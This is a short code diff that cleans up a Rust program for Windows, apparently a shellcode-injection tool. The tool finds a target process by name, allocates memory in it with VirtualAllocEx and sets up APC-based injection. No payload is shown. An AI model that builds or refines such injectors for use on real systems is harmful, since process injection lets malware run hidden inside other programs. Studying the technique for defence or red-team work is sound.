@@ -1,9 +1,9 @@
-use std::{mem::transmute, os::raw::c_void, process, ptr::null_mut};
+use std::{mem::transmute, os::raw::c_void, ptr::null_mut};
 
 use windows_sys::{
     Wdk::System::SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
     Win32::{
-        Foundation::{GetLastError, PAPCFUNC, STATUS_INFO_LENGTH_MISMATCH},
+        Foundation::{PAPCFUNC, STATUS_INFO_LENGTH_MISMATCH},
         System::{
             Diagnostics::Debug::WriteProcessMemory,
             Memory::{
@@ -143,6 +143,7 @@ fn main() {
 
     if pid == 0 {
         println!("[-] Failed to find process ID for {}", process_name);
+        return;
     }
 
     println!("[+] Found process ID: {}", pid);
@@ -166,7 +167,7 @@ fn main() {
             return;
         }
 
-        let mut remote_buffer = VirtualAllocEx(
+        let remote_buffer = VirtualAllocEx(
             process_handle,
             null_mut(),
             SHELLCODE_SIZE,
